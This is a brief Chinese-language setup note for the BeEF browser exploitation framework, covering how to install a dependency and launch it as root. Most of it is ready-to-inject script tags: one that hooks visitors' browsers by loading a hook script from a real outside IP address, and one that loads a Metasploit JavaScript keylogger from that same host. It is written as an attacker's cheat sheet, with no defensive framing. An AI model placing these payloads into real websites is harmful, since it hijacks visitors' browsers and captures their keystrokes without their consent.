beef的配置
=======

可能需要手动安装
```bash
gem install em-websocket
```
来解决问题

不知为何，打开程序一定要在root用户中通过
```bash
nohup ./beef &
```
来实现，而不能使用完整路径如
```bash
nohup /usr/share/beef-xss/beef &
```

## 使用的script
在网站内部使用
```javascript
<script>
	var commandModuleStr = '<script src="' + window.location.protocol + '//' + window.location.host + '/hokasa.js" type="text/javascript"><\/script>';
	document.write(commandModuleStr);
</script>
```
在网站外部使用
```javascript
<script src="139.162.69.124/hokasa.js"> </script>
```

# msf的keylogger的地址
```javascript
<script type="text/javascript" src="http://139.162.69.124:8080/[ReplaceThis]/[whatever].js">
```
具体可以参考网址
https://community.rapid7.com/community/metasploit/blog/2012/02/21/metasploit-javascript-keylogger
